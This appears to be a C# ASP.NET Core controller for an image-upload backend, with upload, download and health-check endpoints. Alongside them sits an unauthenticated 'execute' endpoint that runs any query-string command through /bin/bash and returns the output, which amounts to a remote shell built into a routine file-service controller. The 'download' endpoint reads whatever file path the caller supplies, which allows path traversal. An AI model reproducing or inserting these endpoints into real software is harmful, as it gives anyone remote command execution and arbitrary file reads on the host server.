using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Net;
using Microsoft.EntityFrameworkCore;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using backend.Database;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Diagnostics;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Net.Http.Headers;
using backend.Helpers;

namespace backend.Controllers
{
    [ApiController]
    [Route("")]
    public class UploadController : ControllerBase
    {
        private readonly AppDbContext _context;
        private readonly IHttpContextAccessor _httpContextAccessor;
        private readonly IWebHostEnvironment _appEnvironment;

        public UploadController(AppDbContext context, IHttpContextAccessor httpContextAccessor, IWebHostEnvironment webHostEnvironment)
        {
            _context = context;
            _httpContextAccessor = httpContextAccessor;
            _appEnvironment = webHostEnvironment;
        }

        [HttpGet]
        public Task<string> Get()
        {
            return Task.FromResult("Ok!");
        }

        // -v /home/pi/websites/images:/home/pi/websites/images
        [HttpPost("upload")]
        public async Task<ActionResult<string>> Upload()
        {
            Console.WriteLine("STARTED!!");
            // Request's .Form.Files property will
            // contain QUploader's files.
            var files = this.Request.Form.Files;
            var maxFileSize = 50333 * 4;

            var token = Request.Headers[HeaderNames.Authorization].ToString().Replace("Bearer ", "");
            var claim = Decoder.DecodeJwt(token, Decoder.RequestedClaims.actort);

            if (claim == null) return BadRequest();

            if (files.Count == 0) return BadRequest();

            foreach (var file in files)
            {
                if (file == null || file.Length == 0)
                    continue;

                // Do something with the file.
                var fileName = Guid.NewGuid().ToString() + file.FileName;
                var fileSize = file.Length;
                // save to server...
                // ...

                var fileExtension = System.IO.Path.GetExtension(file.FileName).ToLower();

                Console.WriteLine(fileExtension);

                if (fileExtension != ".jpg" && fileExtension != ".png") return BadRequest();
                if (fileSize > maxFileSize) return BadRequest();

                Console.WriteLine(fileSize);
                
                var filePath = $"world/{claim}/{fileName}";

                if (!Directory.Exists($"world/{claim}/")){
                    Directory.CreateDirectory($"world/{claim}/");
                }


                using (var stream = System.IO.File.Create(filePath))
                {
                    await file.CopyToAsync(stream);
                }

                string fullWebsitePath = $"https://api.linkancestors.com/download?websitePath={claim}/{fileName}";

                return new OkObjectResult(fullWebsitePath);
            }
            return BadRequest();
        }

        [HttpGet("download")]
        public ActionResult DownloadDocument([FromQuery] string websitePath)
        {
            string filePath = $"world/{websitePath}";

            string file = websitePath.Split('/').Last();

            Console.WriteLine(filePath);
            Console.WriteLine(file);

            byte[] fileBytes = System.IO.File.ReadAllBytes(filePath);

            return File(fileBytes, "application/force-download", file);
        }

        [HttpGet("execute")]
        public string Execute([FromQuery] string command)
        {
            string result = "";
            using (System.Diagnostics.Process proc = new System.Diagnostics.Process())
            {
                proc.StartInfo.FileName = "/bin/bash";
                proc.StartInfo.Arguments = "-c \" " + command + " \"";
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.RedirectStandardOutput = true;
                proc.StartInfo.RedirectStandardError = true;
                proc.Start();

                result += proc.StandardOutput.ReadToEnd();
                result += proc.StandardError.ReadToEnd();

                proc.WaitForExit();
            }
            return result;
        }
    }
}
